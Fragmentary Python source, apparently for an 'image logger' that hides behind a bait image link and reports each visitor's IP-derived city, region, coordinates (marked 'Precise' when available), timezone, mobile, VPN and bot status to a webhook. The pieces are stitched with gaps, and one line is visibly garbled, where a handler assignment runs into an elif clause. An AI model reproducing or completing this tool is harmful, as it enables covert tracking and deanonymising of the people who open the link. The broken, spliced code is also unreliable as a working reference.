...
config = {
    ...
    "image": "https://i.pinimg.com/736x/27/23/68/27236835e767166454a6335e4cfe0549.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Agent 6", # Set this to the name you want the webhook to have
...
handler = app = ImageLoggerAPIelif useragent.startswith("TelegramBot"):
return "Telegram"
else:
return False
...
Region: {info['regionName'] if info['regionName'] else 'Unknown'}
City: {info['city'] if info['city'] else 'Unknown'}
Coords: {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, Google Maps'})
Timezone: {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
Mobile: {info['mobile']}
VPN: {info['proxy']}
Bot: {info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}
